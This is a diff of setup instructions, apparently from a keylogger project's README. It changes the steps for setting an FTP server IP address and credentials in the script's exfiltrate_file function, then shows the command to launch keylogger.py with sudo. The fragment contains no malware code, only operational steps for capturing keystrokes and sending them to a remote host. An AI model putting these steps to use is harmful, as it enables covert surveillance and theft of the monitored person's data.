@@ -45,8 +45,8 @@ SETUP INSTRUCTIONS
 5 Configure the IP address and the user for the FTP exfiltration
 - sudo nano keylogger.py
 - Look for the exfiltrate_file function
-- Replace the IP address with your own Ubuntu IP address on this line of code: ftp = FTP("10.0.0.58")
-- Replace the username and password with your own credentials on this line of code: ftp.login("vmuser", "ab12cd34")
+- Insert your own Ubuntu IP address on this line of code: ftp = FTP("YOUR_UBUNTU_IP")
+- Insert your own Ubuntu credentials on this line of code: ftp.login("UBUNTU_USERNAME", "PASSWORD")
 
 6 Start the keylogger script
 - sudo python3 keylogger.py
